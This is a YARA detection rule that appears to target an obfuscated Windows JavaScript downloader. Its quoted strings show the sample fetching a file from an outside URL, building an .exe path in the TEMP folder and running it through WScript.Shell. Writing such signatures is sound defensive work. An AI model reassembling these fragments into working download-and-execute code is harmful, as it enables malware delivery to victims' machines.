rule sig_20160401_839b0c8678ac93ad97d7c801b5c8bc26 {
  meta:
    description = "datamaliciousorder - file 20160401_839b0c8678ac93ad97d7c801b5c8bc26.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8135fe79488891e3458d58d7e607b7b9cc8964c9c9121bfdfe77fc83decfcc84"

  strings:
    $s1  = "WqDxy[UiRk](\"G\" + \"ET\", \"http://beatorooms.com/n2isa\", false);" fullword ascii
    $s2  = "function LuXii(NfEpe, ApeEgh){FgHiy = FgHiy * 1; return NfEpe - ApeEgh;};" fullword ascii
    $s3  = "var KqlNx = function HqhVd() {return WScript[RaYe](\"WScript\"+\".Shell\");}(), IgrDls = 11;" fullword ascii
    $s4  = "if (WqDxy[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function CiyJx(){return LnySq + \"\";};" fullword ascii
    $s6  = "function NuEqz() {return KqlNx[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"VvIS1ocxoD6mFyd.ex\" + \"e\";};" fullword ascii
    $s7  = "function BjIv() {return ((GwOv == true) && (GwOv == CgYsi)) ? 1 : FgHiy;};" fullword ascii
    $s8  = "var GwOv = false;" fullword ascii
    $s9  = "var CgYsi = false;" fullword ascii
    $s10 = "function PgdCsp(){return 23;};" fullword ascii
    $s11 = "function IezMe(){return RaYe;};" fullword ascii
    $s12 = "CgYsi = true; " fullword ascii
    $s13 = "function BoYn(OvgXp) {var ChGk = (1, 2, 3, 4, 5, OvgXp); return ChGk;};" fullword ascii
    $s14 = "function ObAei()" fullword ascii
    $s15 = "var OaUeg = false;" fullword ascii
    $s16 = "GwOv = true; " fullword ascii
    $s17 = "}while (CcnXyz);" fullword ascii
    $s18 = "var AyVoi = new this[\"Date\"]();" fullword ascii
    $s19 = "function LskIui(RcTha){KqlNx[\"R\"+\"un\"](RcTha, FgHiy, FgHiy);};" fullword ascii
    $s20 = "return LuXii(KdoMul, MmuHc);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}